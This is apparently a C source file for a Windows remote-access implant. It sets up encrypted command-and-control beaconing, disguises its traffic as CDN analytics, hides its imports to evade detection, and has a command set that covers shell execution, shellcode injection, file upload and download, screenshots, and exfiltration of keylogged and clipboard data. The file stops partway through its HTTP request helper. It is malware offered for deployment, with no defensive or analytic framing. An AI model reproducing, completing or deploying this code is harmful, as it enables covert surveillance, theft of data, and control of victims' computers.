/*
 * lb_c2.c
 * Platform  : Windows 7+ (x86/x64)
 * File      : lb_c2.c
 * Compiler  : MSVC cl  /  MinGW-w64 gcc (>= 12)
 *
 * Build (MSVC):
 *   cl boom.c lb_payload.c lb_c2.c /Felb.exe
 *      /link ws2_32.lib advapi32.lib shell32.lib gdi32.lib user32.lib bcrypt.lib
 *
 * Build (MinGW):
 *   gcc boom.c lb_payload.c lb_c2.c -o lb.exe
 *       -lws2_32 -ladvapi32 -lshell32 -lgdi32 -luser32 -lbcrypt
 *
 * Role      : C2 implant channel.
 *   - AES-128-CBC encryption via BCrypt CNG (bcrypt.dll, linked statically)
 *   - WinHTTP loaded at runtime (LoadLibraryA) — no winhttp.lib, no static
 *     import table entry for winhttp functions
 *   - Encrypted HTTP(S) beaconing with jitter
 *   - Primary / fallback C2 with automatic switchover
 *   - Full command dispatcher: SHELL, PS, KILL, DOWNLOAD, UPLOAD,
 *     SCREENSHOT, INJECT, SLEEP, KEYLOG_GET, CLIP_GET, DIE
 *   - Replaces net_beacon() and exfil_send_raw() from boom.c / lb_payload.c
 *
 * Protocol:
 *   Beacon  POST /<C2_BEACON_URI>
 *           Body : base64( IV[16] || AES128CBC(checkin_json) )
 *           Resp : base64( IV[16] || AES128CBC(task_blob) )  or empty
 *   Result  POST /<C2_RESULT_URI>
 *           Hdr  : X-Sess: <agent_id>
 *           Body : base64( IV[16] || AES128CBC(result_blob) )
 *
 *   task_blob   := CMD_TYPE '\n' param1 '\n' param2 '\n' ...
 *   result_blob := CMD_TYPE '\n' exit_status '\n' data
 *
 * Sections:
 *   1   Compile-time configuration
 *   2   WinHTTP type definitions (all inline, no winhttp.h dependency)
 *   3   C2 state structure
 *   4   Utility (agent ID, OS version, privilege check, jitter, logging)
 *   5   Base64 encode / decode
 *   6   BCrypt CNG: key derivation (SHA-256) + AES-128-CBC encrypt/decrypt
 *   7   WinHTTP dynamic loader
 *   8   HTTP request helper (shared POST/GET path)
 *   9   Beacon protocol: check-in, response parse, result post, line split
 *  10   Command handlers
 *       10.1  NOP
 *       10.2  SHELL  — hidden CreateProcess, pipe stdout+stderr, report
 *       10.3  PS     — Toolhelp32 process list
 *       10.4  KILL   — TerminateProcess by PID
 *       10.5  DOWNLOAD — HTTP GET from C2 → local disk
 *       10.6  UPLOAD   — local file → encrypted HTTP POST
 *       10.7  SCREENSHOT — GDI BitBlt BMP in memory → encrypted HTTP POST
 *       10.8  INJECT   — base64 shellcode → VirtualAllocEx + CRT injection
 *       10.9  SLEEP    — reconfigure beacon interval + jitter
 *       10.10 KEYLOG_GET — exfil keylog accumulation file
 *       10.11 CLIP_GET   — exfil clipboard harvest file
 *       10.12 DIE        — signal clean shutdown
 *  11   Command dispatcher
 *  12   Fallback C2 switchover
 *  13   Public API: c2_init, c2_run, c2_report_event, c2_shutdown
 */

#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT  0x0A00       /* Windows 7+ /10/ 11 */
#include <windows.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <bcrypt.h>                /* AES, SHA-256 via CNG */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <ctype.h>
#include <time.h>

#pragma comment(lib, "bcrypt.lib")

/* ═══════════════════════════════════════════════════════════════════════════
 * SECTION 1 — Compile-time configuration
 * Change these to match the actual C2 deployment before building.
 * ═══════════════════════════════════════════════════════════════════════════ */

/* Primary C2 endpoint */
#define C2_HOST_PRIMARY       L"192.168.1.100"
#define C2_PORT_PRIMARY       8080
#define C2_USE_TLS_PRIMARY    0             /* 0=HTTP  1=HTTPS */

/* Fallback C2 endpoint — activated after C2_FAIL_THRESHOLD consecutive errors */
#define C2_HOST_FALLBACK      L"10.0.0.50"
#define C2_PORT_FALLBACK      443
#define C2_USE_TLS_FALLBACK   1

/* URI paths — disguised as CDN / analytics traffic */
#define C2_BEACON_URI         L"/cdn-cgi/analytics/update"
#define C2_RESULT_URI         L"/cdn-cgi/analytics/result"
#define C2_DL_URI_PREFIX      L"/cdn-cgi/static/"    /* filename appended per request */

/* Beacon timing */
#define C2_BEACON_INTERVAL_MS 60000         /* 60 s nominal beacon interval */
#define C2_JITTER_PCT         25            /* ± 25% random variance        */
#define C2_FAIL_THRESHOLD     5             /* consecutive failures before C2 switch */
#define C2_RECONNECT_DELAY_MS 30000         /* extra back-off after switching C2 */
#define C2_HTTP_TIMEOUT_MS    10000         /* per-request connect / send / recv */

/* AES-128-CBC: 16-byte key derived from passphrase via SHA-256 */
#define C2_AES_KEYLEN         16
#define C2_AES_BLOCKLEN       16
#define C2_SHA256_LEN         32
#define C2_KEY_PASSPHRASE     "lb_xF9#mP2@wQz7$"   /* change before deployment */

/* Browser-style User-Agent to blend with normal traffic */
#define C2_USER_AGENT \
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) " \
    L"AppleWebKit/537.36 (KHTML, like Gecko) " \
    L"Chrome/124.0.0.0 Safari/537.36"

/* Session identification header; value = agent_id hex string */
#define C2_SESS_HEADER        L"X-Sess"

/* Log and data directories — mirrors lb_payload.c paths */
#define C2_LOG_DIR            "C:\\ProgramData\\wuh\\"
#define C2_LOG_FILE           C2_LOG_DIR "c2.log"
#define C2_KEYLOG_FILE        C2_LOG_DIR "kl.dat"
#define C2_CLIP_FILE          C2_LOG_DIR "cb.dat"

/* Max single-file upload size (bytes) */
#define C2_MAX_UPLOAD_BYTES   (50UL * 1024UL * 1024UL)

/* Command type string constants */
#define CMD_NOP               "NOP"
#define CMD_SHELL             "SHELL"
#define CMD_PS                "PS"
#define CMD_KILL              "KILL"
#define CMD_DOWNLOAD          "DOWNLOAD"
#define CMD_UPLOAD            "UPLOAD"
#define CMD_SCREENSHOT        "SCREENSHOT"
#define CMD_INJECT            "INJECT"
#define CMD_SLEEP             "SLEEP"
#define CMD_KEYLOG_GET        "KEYLOG_GET"
#define CMD_CLIP_GET          "CLIP_GET"
#define CMD_DIE               "DIE"

/* ═══════════════════════════════════════════════════════════════════════════
 * SECTION 2 — WinHTTP type definitions
 * All inline — no #include <winhttp.h>, no winhttp.lib at link time.
 * Functions resolved at runtime via GetProcAddress to suppress static imports.
 * ═══════════════════════════════════════════════════════════════════════════ */

typedef PVOID HINTERNET;
typedef WORD INTERNET_PORT;

#define WINHTTP_ACCESS_TYPE_NO_PROXY          1

#define WINHTTP_NO_PROXY_NAME                 NULL
#define WINHTTP_NO_PROXY_BYPASS               NULL
#define WINHTTP_FLAG_SECURE                   0x00800000UL
#define WINHTTP_OPTION_SECURITY_FLAGS         31
#define WINHTTP_OPTION_CONNECT_TIMEOUT        3
#define WINHTTP_OPTION_RECEIVE_TIMEOUT        4
#define WINHTTP_OPTION_SEND_TIMEOUT           5
#define WINHTTP_QUERY_STATUS_CODE             19
#define WINHTTP_QUERY_FLAG_NUMBER             0x20000000UL
#define WINHTTP_NO_ADDITIONAL_HEADERS         NULL
#define WINHTTP_NO_REQUEST_DATA               NULL
#define WINHTTP_HEADER_NAME_BY_INDEX          NULL
#define WINHTTP_NO_HEADER_INDEX               NULL
#define INTERNET_DEFAULT_HTTP_PORT            80
#define INTERNET_DEFAULT_HTTPS_PORT           443

/* Ignore all TLS certificate errors (self-signed C2 certs) */
#define SECURITY_FLAG_IGNORE_UNKNOWN_CA       0x00000100UL
#define SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE 0x00000200UL
#define SECURITY_FLAG_IGNORE_CERT_CN_INVALID  0x00001000UL
#define SECURITY_FLAG_IGNORE_CERT_DATE_INVALID 0x00002000UL
#define SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS  0x00003300UL

typedef HINTERNET (WINAPI *pfn_WinHttpOpen)(
    LPCWSTR pwszAgentW, DWORD dwAccessType,
    LPCWSTR pwszProxyW, LPCWSTR pwszProxyBypassW, DWORD dwFlags);

typedef HINTERNET (WINAPI *pfn_WinHttpConnect)(
    HINTERNET hSession, LPCWSTR pswzServerName,
    INTERNET_PORT nServerPort, DWORD dwReserved);

typedef HINTERNET (WINAPI *pfn_WinHttpOpenRequest)(
    HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName,
    LPCWSTR pwszVersion, LPCWSTR pwszReferrer,
    LPCWSTR *ppwszAcceptTypes, DWORD dwFlags);

typedef BOOL (WINAPI *pfn_WinHttpSendRequest)(
    HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength,
    LPVOID lpOptional, DWORD dwOptionalLength,
    DWORD dwTotalLength, DWORD_PTR dwContext);

typedef BOOL (WINAPI *pfn_WinHttpReceiveResponse)(
    HINTERNET hRequest, LPVOID lpReserved);

typedef BOOL (WINAPI *pfn_WinHttpReadData)(
    HINTERNET hRequest, LPVOID lpBuffer,
    DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);

typedef BOOL (WINAPI *pfn_WinHttpQueryDataAvailable)(
    HINTERNET hRequest, LPDWORD lpdwNumberOfBytesAvailable);

typedef BOOL (WINAPI *pfn_WinHttpQueryHeaders)(
    HINTERNET hRequest, DWORD dwInfoLevel, LPCWSTR pwszName,
    LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex);

typedef BOOL (WINAPI *pfn_WinHttpSetOption)(
    HINTERNET hInternet, DWORD dwOption,
    LPVOID lpBuffer, DWORD dwBufferLength);

typedef BOOL (WINAPI *pfn_WinHttpCloseHandle)(HINTERNET hInternet);

/* Grouped into one struct — loaded once in winhttp_load() */
typedef struct {
    HMODULE                    lib;
    pfn_WinHttpOpen            Open;
    pfn_WinHttpConnect         Connect;
    pfn_WinHttpOpenRequest     OpenRequest;
    pfn_WinHttpSendRequest     SendRequest;
    pfn_WinHttpReceiveResponse ReceiveResponse;
    pfn_WinHttpReadData        ReadData;
    pfn_WinHttpQueryDataAvailable QueryDataAvailable;
    pfn_WinHttpQueryHeaders    QueryHeaders;
    pfn_WinHttpSetOption       SetOption;
    pfn_WinHttpCloseHandle     CloseHandle;
} WinHttpVtbl;

static WinHttpVtbl g_http;

/* ═══════════════════════════════════════════════════════════════════════════
 * SECTION 3 — C2 global state
 * ═══════════════════════════════════════════════════════════════════════════ */

typedef struct {
    /* Active C2 target (swapped on fallback) */
    LPCWSTR       host;
    int           port;
    int           use_tls;

    /* AES-128 key derived at init from C2_KEY_PASSPHRASE */
    BYTE          aes_key[C2_AES_KEYLEN];
    BOOL          key_ready;

    /* Agent identity (filled at c2_init) */
    char          agent_id[64];     /* hex machine GUID, no hyphens */
    char          hostname[MAX_COMPUTERNAME_LENGTH + 1];
    char          username[256];
    int           is_admin;

    /* Beacon timing */
    DWORD         beacon_ms;
    int           jitter_pct;

    /* Failure / switchover tracking */
    int           fail_count;
    int           using_fallback;

    /* Monotonic sequence counter (beacon sequence number) */
    volatile LONG seq;

    /* Shutdown flag — set by CMD_DIE or c2_shutdown() */
    volatile BOOL shutdown;

} C2State;

static C2State g_c2;   /* zero-initialised at program startup */

/* ═══════════════════════════════════════════════════════════════════════════
 * SECTION 4 — Utility
 * ═══════════════════════════════════════════════════════════════════════════ */

/* Append a timestamped line to the C2 log file */
static void c2_log(const char *fmt, ...) {
    HANDLE h = CreateFileA(C2_LOG_FILE, FILE_APPEND_DATA, FILE_SHARE_READ,
                            NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;

    SYSTEMTIME st;
    GetLocalTime(&st);
    char header[52];
    int  hlen = snprintf(header, sizeof header,
                         "[%04d-%02d-%02d %02d:%02d:%02d] [c2] ",
                         st.wYear, st.wMonth, st.wDay,
                         st.wHour, st.wMinute, st.wSecond);
    char body[1024];
    va_list ap;
    va_start(ap, fmt);
    int blen = vsnprintf(body, sizeof body, fmt, ap);
    va_end(ap);

    DWORD written;
    WriteFile(h, header, (DWORD)hlen, &written, NULL);
    WriteFile(h, body,   (DWORD)blen, &written, NULL);
    WriteFile(h, "\r\n", 2,           &written, NULL);
    CloseHandle(h);
}

/*
 * Read HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid,
 * strip hyphens, lowercase → stable per-machine identity string.
 */
static void derive_agent_id(char *out, size_t out_sz) {
    HKEY key;
    const char *kpath = "SOFTWARE\\Microsoft\\Cryptography";
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, kpath, 0,
                      KEY_READ | KEY_WOW64_64KEY, &key) != ERROR_SUCCESS) {
        strncpy(out, "00000000000000000000000000000000", out_sz - 1);
        return;
    }
    char guid[48] = {0};
    DWORD sz = sizeof guid - 1, type;
    RegQueryValueExA(key, "MachineGuid", NULL, &type, (BYTE *)guid, &sz);
    RegCloseKey(key);

    char *src = guid, *dst = out;
    size_t rem = out_sz - 1;
    while (*src && rem > 0) {
        if (*src != '-') { *dst++ = (char)tolower((unsigned char)*src); rem--; }
        src++;
    }
    *dst = '\0';
}

/* Windows OS build string via RtlGetVersion (bypasses manifest check) */
static void get_os_version(char *buf, size_t sz) {
    typedef LONG (WINAPI *pfnRtlGV)(void *);
    struct {
        ULONG dwOSVersionInfoSize;
        ULONG dwMajorVersion;
        ULONG dwMinorVersion;
        ULONG dwBuildNumber;
        ULONG dwPlatformId;
        WCHAR szCSDVersion[128];
        USHORT wServicePackMajor;
        USHORT wServicePackMinor;
        USHORT wSuiteMask;
        UCHAR  wProductType;
        UCHAR  wReserved;
    } vi;
    ZeroMemory(&vi, sizeof vi);
    vi.dwOSVersionInfoSize = sizeof vi;

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    pfnRtlGV fn = ntdll
        ? (pfnRtlGV)GetProcAddress(ntdll, "RtlGetVersion")
        : NULL;
    if (fn) fn(&vi);

    snprintf(buf, sz, "Win%lu.%lu.%lu",
             vi.dwMajorVersion, vi.dwMinorVersion, vi.dwBuildNumber);
}

/* Returns 1 if current process token is in the Administrators group */
static int c2_is_admin(void) {
    BOOL r = FALSE;
    SID_IDENTIFIER_AUTHORITY auth = SECURITY_NT_AUTHORITY;
    PSID sid;
    if (AllocateAndInitializeSid(&auth, 2,
            SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
            0, 0, 0, 0, 0, 0, &sid)) {
        CheckTokenMembership(NULL, sid, &r);
        FreeSid(sid);
    }
    return r ? 1 : 0;
}

/*
 * Return a cryptographically random 32-bit value.
 * Uses BCryptGenRandom with BCRYPT_USE_SYSTEM_PREFERRED_RNG so no
 * algorithm handle needs to be open first.
 */
static DWORD secure_rand32(void) {
    DWORD v = 0;
    BCryptGenRandom(NULL, (PUCHAR)&v, sizeof v,
                    BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    return v;
}

/*
 * Compute the actual sleep duration for this beacon cycle:
 *   nominal_ms ± (nominal_ms * jitter_pct / 100)
 * Minimum 1 000 ms regardless.
 */
static DWORD compute_jitter_ms(DWORD nominal_ms, int jitter_pct) {
    if (jitter_pct <= 0 || jitter_pct > 100) return nominal_ms;
    DWORD range  = (DWORD)((UINT64)nominal_ms * (DWORD)jitter_pct / 100UL);
    DWORD offset = (range > 1) ? (secure_rand32() % (range * 2)) : 0;
    LONG  result = (LONG)nominal_ms - (LONG)range + (LONG)offset;
    return (DWORD)((result < 1000) ? 1000 : result);
}

/* Enable a named privilege in the calling process token.  Returns 1 on success. */
static int enable_privilege(const char *priv_name) {
    HANDLE token = NULL;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
        return 0;
    LUID luid;
    int ok = 0;
    if (LookupPrivilegeValueA(NULL, priv_name, &luid)) {
        TOKEN_PRIVILEGES tp;
        tp.PrivilegeCount           = 1;
        tp.Privileges[0].Luid       = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        ok = AdjustTokenPrivileges(token, FALSE, &tp, sizeof tp, NULL, NULL) &&
             (GetLastError() != ERROR_NOT_ALL_ASSIGNED);
    }
    CloseHandle(token);
    return ok;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * SECTION 5 — Base64 encode / decode
 * Standard RFC 4648 with '=' padding.
 * ═══════════════════════════════════════════════════════════════════════════ */

static const char B64_TABLE[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/*
 * b64_encode — encode src_len bytes of src to a NUL-terminated base64 string.
 * Returns malloc'd string; caller frees.  *out_chars (if non-NULL) set to
 * number of base64 characters written (not counting NUL).
 * Returns NULL on allocation failure.
 */
static char *b64_encode(const BYTE *src, SIZE_T src_len, SIZE_T *out_chars) {
    SIZE_T enc_len = ((src_len + 2) / 3) * 4;
    char  *dst = (char *)malloc(enc_len + 1);
    if (!dst) return NULL;

    SIZE_T i = 0, j = 0;
    while (i < src_len) {
        DWORD triplet = 0;
        int   nbytes  = 0;
        while (i < src_len && nbytes < 3)
            { triplet = (triplet << 8) | src[i++]; nbytes++; }
        triplet <<= (3 - nbytes) * 8;

        dst[j++] = B64_TABLE[(triplet >> 18) & 0x3F];
        dst[j++] = B64_TABLE[(triplet >> 12) & 0x3F];
        dst[j++] = (nbytes > 1) ? B64_TABLE[(triplet >> 6) & 0x3F] : '=';
        dst[j++] = (nbytes > 2) ? B64_TABLE[(triplet)      & 0x3F] : '=';
    }
    dst[j] = '\0';
    if (out_chars) *out_chars = j;
    return dst;
}

/* Map a single base64 char to its 6-bit value; returns -1 for invalid/pad */
static int b64_val(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

/*
 * b64_decode — decode src_len base64 characters into a byte buffer.
 * Returns malloc'd buffer; caller frees.  *out_len set to decoded byte count.
 * Returns NULL on allocation failure or invalid input.
 */
static BYTE *b64_decode(const char *src, SIZE_T src_len, SIZE_T *out_len) {
    if (!src || src_len < 4) return NULL;
    /* Trim trailing whitespace / newlines in-place on a local copy */
    while (src_len > 0 && (src[src_len-1] == '\r' || src[src_len-1] == '\n'
                            || src[src_len-1] == ' '))
        src_len--;

    SIZE_T dec_cap = (src_len / 4) * 3 + 4;
    BYTE  *dst     = (BYTE *)malloc(dec_cap);
    if (!dst) return NULL;

    SIZE_T i = 0, j = 0;
    while (i + 3 < src_len) {
        int a = b64_val(src[i]);
        int b = b64_val(src[i+1]);
        int c = (src[i+2] == '=') ? 0 : b64_val(src[i+2]);
        int d = (src[i+3] == '=') ? 0 : b64_val(src[i+3]);
        if (a < 0 || b < 0 || c < 0 || d < 0) { free(dst); return NULL; }

        dst[j++] = (BYTE)((a << 2) | (b >> 4));
        if (src[i+2] != '=') dst[j++] = (BYTE)((b << 4) | (c >> 2));
        if (src[i+3] != '=') dst[j++] = (BYTE)((c << 6) |  d);
        i += 4;
    }
    dst[j] = '\0';   /* NUL-terminate for text payloads */
    if (out_len) *out_len = j;
    return dst;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * SECTION 6 — BCrypt CNG: key derivation + AES-128-CBC
 * ═══════════════════════════════════════════════════════════════════════════ */

/*
 * crypto_derive_key
 * SHA-256(passphrase) → take first 16 bytes as the AES-128 key.
 * Writes result into out[0..C2_AES_KEYLEN-1].
 * Returns 1 on success, 0 on any BCrypt failure.
 */
static int crypto_derive_key(const char *passphrase, BYTE out[C2_AES_KEYLEN]) {
    BCRYPT_ALG_HANDLE  hAlg  = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    BYTE  digest[C2_SHA256_LEN];
    DWORD obj_sz = 0, cb = sizeof obj_sz;
    int   result = 0;

    NTSTATUS nt = BCryptOpenAlgorithmProvider(
        &hAlg, BCRYPT_SHA256_ALGORITHM, NULL, BCRYPT_HASH_REUSABLE_FLAG);
    if (!BCRYPT_SUCCESS(nt)) goto done;

    nt = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH,
                           (PBYTE)&obj_sz, cb, &cb, 0);
    if (!BCRYPT_SUCCESS(nt)) goto done;

    BYTE *hash_obj = (BYTE *)HeapAlloc(GetProcessHeap(), 0, obj_sz);
    if (!hash_obj) goto done;

    nt = BCryptCreateHash(hAlg, &hHash, hash_obj, obj_sz, NULL, 0,
                          BCRYPT_HASH_REUSABLE_FLAG);
    if (!BCRYPT_SUCCESS(nt)) { HeapFree(GetProcessHeap(), 0, hash_obj); goto done; }

    nt = BCryptHashData(hHash, (PUCHAR)passphrase, (ULONG)strlen(passphrase), 0);
    if (!BCRYPT_SUCCESS(nt)) goto hash_done;

    nt = BCryptFinishHash(hHash, digest, C2_SHA256_LEN, 0);
    if (!BCRYPT_SUCCESS(nt)) goto hash_done;

    memcpy(out, digest, C2_AES_KEYLEN);
    SecureZeroMemory(digest, sizeof digest);
    result = 1;

hash_done:
    BCryptDestroyHash(hHash);
    HeapFree(GetProcessHeap(), 0, hash_obj);
done:
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
}

/* Encrypted blob: data = IV[16] || ciphertext, len = total byte count */
typedef struct { BYTE *data; SIZE_T len; } EncBlob;

/*
 * aes_encrypt
 * AES-128-CBC with PKCS7 padding.
 * Prepends a freshly generated random IV to the ciphertext.
 * blob.data is malloc'd; caller frees.  blob.len == 0 on failure.
 */
static EncBlob aes_encrypt(const BYTE *plain, SIZE_T plain_len) {
    EncBlob blob = {NULL, 0};
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD obj_sz = 0, cb = sizeof obj_sz, cipher_sz = 0, written = 0;

    BYTE iv[C2_AES_BLOCKLEN];
    BCryptGenRandom(NULL, iv, sizeof iv, BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    NTSTATUS nt = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(nt)) goto done;

    nt = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                           (PBYTE)BCRYPT_CHAIN_MODE_CBC,
                           sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(nt)) goto done;

    nt = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH,
                           (PBYTE)&obj_sz, cb, &cb, 0);
    if (!BCRYPT_SUCCESS(nt)) goto done;

    BYTE *key_obj = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, obj_sz);
    if (!key_obj) goto done;

    nt = BCryptGenerateSymmetricKey(hAlg, &hKey, key_obj, obj_sz,
                                    g_c2.aes_key, C2_AES_KEYLEN, 0);
    if (!BCRYPT_SUCCESS(nt)) { HeapFree(GetProcessHeap(), 0, key_obj); goto done; }

    /* First call: query required output size */
    BYTE iv_q[C2_AES_BLOCKLEN];
    memcpy(iv_q, iv, sizeof iv_q);
    nt = BCryptEncrypt(hKey, (PUCHAR)plain, (ULONG)plain_len, NULL,
                       iv_q, sizeof iv_q, NULL, 0, &cipher_sz,
                       BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(nt)) {
        BCryptDestroyKey(hKey);
        HeapFree(GetProcessHeap(), 0, key_obj);
        goto done;
    }

    blob.data = (BYTE *)malloc(C2_AES_BLOCKLEN + cipher_sz);
    if (!blob.data) {
        BCryptDestroyKey(hKey);
        HeapFree(GetProcessHeap(), 0, key_obj);
        goto done;
    }
    memcpy(blob.data, iv, C2_AES_BLOCKLEN);

    /* Second call: actual encryption (use fresh IV copy — BCrypt modifies it) */
    BYTE iv_e[C2_AES_BLOCKLEN];
    memcpy(iv_e, iv, sizeof iv_e);
    nt = BCryptEncrypt(hKey, (PUCHAR)plain, (ULONG)plain_len, NULL,
                       iv_e, sizeof iv_e,
                       blob.data + C2_AES_BLOCKLEN, cipher_sz, &written,
                       BCRYPT_BLOCK_PADDING);
    BCryptDestroyKey(hKey);
    HeapFree(GetProcessHeap(), 0, key_obj);

    if (!BCRYPT_SUCCESS(nt)) { free(blob.data); blob.data = NULL; goto done; }
    blob.len = C2_AES_BLOCKLEN + written;

done:
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return blob;
}

/*
 * aes_decrypt
 * Input must be IV[16] || ciphertext as produced by aes_encrypt.
 * Returns malloc'd plaintext buffer (NUL-terminated), sets *out_len.
 * Returns NULL on failure.
 */
static BYTE *aes_decrypt(const BYTE *enc, SIZE_T enc_len, SIZE_T *out_len) {
    if (!enc || enc_len <= C2_AES_BLOCKLEN) return NULL;

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BYTE  *plain   = NULL;
    DWORD  obj_sz  = 0, cb = sizeof obj_sz;
    DWORD  plain_sz = 0, written = 0;

    const BYTE *iv         = enc;
    const BYTE *ciphertext = enc + C2_AES_BLOCKLEN;
    ULONG       cipher_len = (ULONG)(enc_len - C2_AES_BLOCKLEN);

    NTSTATUS nt = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(nt)) goto done;

    nt = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                           (PBYTE)BCRYPT_CHAIN_MODE_CBC,
                           sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(nt)) goto done;

    nt = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH,
                           (PBYTE)&obj_sz, cb, &cb, 0);
    if (!BCRYPT_SUCCESS(nt)) goto done;

    BYTE *key_obj = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, obj_sz);
    if (!key_obj) goto done;

    nt = BCryptGenerateSymmetricKey(hAlg, &hKey, key_obj, obj_sz,
                                    g_c2.aes_key, C2_AES_KEYLEN, 0);
    if (!BCRYPT_SUCCESS(nt)) { HeapFree(GetProcessHeap(), 0, key_obj); goto done; }

    /* Query plaintext size */
    BYTE iv_q[C2_AES_BLOCKLEN];
    memcpy(iv_q, iv, sizeof iv_q);
    nt = BCryptDecrypt(hKey, (PUCHAR)ciphertext, cipher_len, NULL,
                       iv_q, sizeof iv_q, NULL, 0, &plain_sz,
                       BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(nt)) {
        BCryptDestroyKey(hKey); HeapFree(GetProcessHeap(), 0, key_obj);
        goto done;
    }

    plain = (BYTE *)malloc((SIZE_T)plain_sz + 1);
    if (!plain) {
        BCryptDestroyKey(hKey); HeapFree(GetProcessHeap(), 0, key_obj);
        goto done;
    }

    BYTE iv_d[C2_AES_BLOCKLEN];
    memcpy(iv_d, iv, sizeof iv_d);
    nt = BCryptDecrypt(hKey, (PUCHAR)ciphertext, cipher_len, NULL,
                       iv_d, sizeof iv_d,
                       plain, plain_sz, &written, BCRYPT_BLOCK_PADDING);
    BCryptDestroyKey(hKey);
    HeapFree(GetProcessHeap(), 0, key_obj);

    if (!BCRYPT_SUCCESS(nt)) { free(plain); plain = NULL; goto done; }
    plain[written] = '\0';
    if (out_len) *out_len = (SIZE_T)written;

done:
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return plain;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * SECTION 7 — WinHTTP dynamic loader
 * All WinHTTP symbols resolved at runtime via GetProcAddress.
 * ═══════════════════════════════════════════════════════════════════════════ */

static int winhttp_load(void) {
    if (g_http.lib) return 1;   /* already loaded */

    g_http.lib = LoadLibraryA("winhttp.dll");
    if (!g_http.lib) {
        c2_log("winhttp: LoadLibraryA failed (err=%lu)", GetLastError());
        return 0;
    }

#define LOAD(sym) \
    g_http.sym = (pfn_WinHttp##sym) \
        GetProcAddress(g_http.lib, "WinHttp" #sym); \
    if (!g_http.sym) { \
        c2_log("winhttp: missing WinHttp" #sym); \
        FreeLibrary(g_http.lib); g_http.lib = NULL; return 0; \
    }
    LOAD(Open)
    LOAD(Connect)
    LOAD(OpenRequest)
    LOAD(SendRequest)
    LOAD(ReceiveResponse)
    LOAD(ReadData)
    LOAD(QueryDataAvailable)
    LOAD(QueryHeaders)
    LOAD(SetOption)
    LOAD(CloseHandle)
#undef LOAD

    c2_log("winhttp: loaded (all symbols resolved)");
    return 1;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * SECTION 8 — HTTP request helper
 * ═══════════════════════════════════════════════════════════════════════════ */

typedef struct {
    BYTE  *body;        /* malloc'd response body; caller frees */
    SIZE_T body_len;
    DWORD  status;      /* HTTP status code, or 0 on transport error */
} HttpResp;

/*
 * http_request
 * Issues an HTTP(S) request to the active C2 host.
 *   method      : L"POST" or L"GET"
 *   uri         : resource path including leading slash
 *   req_body    : outgoing body bytes (NULL = no body)
 *   req_body_len: byte count
 *
 * GOTCHA: WinHttpSendRequest's dwTotalLength must equal the body length
 *         when the body is passed in lpOptional.  Mismatches cause
 *         ERROR_WINHTTP_INVALID_PARAMETER at SendRequest time.
 *
 * Returns HttpResp; resp.body may be NULL on transport error.
 * Caller must free resp.body.
 */
static HttpResp http_request(LPCWSTR method, LPCWSTR uri,
                               const BYTE *req_body, DWORD req_body_len)
{
    HttpResp resp = {NULL, 0, 0};
    if (!winhttp_load()) return resp;

    DWORD timeout = C2_HTTP_TIMEOUT_MS;

    HINTERNET hSession = g_http.Open(C2_USER_AGENT,
                                      WINHTTP_ACCESS_TYPE_NO_PROXY,
                                      WINHTTP_NO_PROXY_NAME,
                                      WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        c2_log("http: WinHttpOpen failed (%lu)", GetLastError());
        return resp;
    }
    g_http.SetOption(hSession, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof timeout);
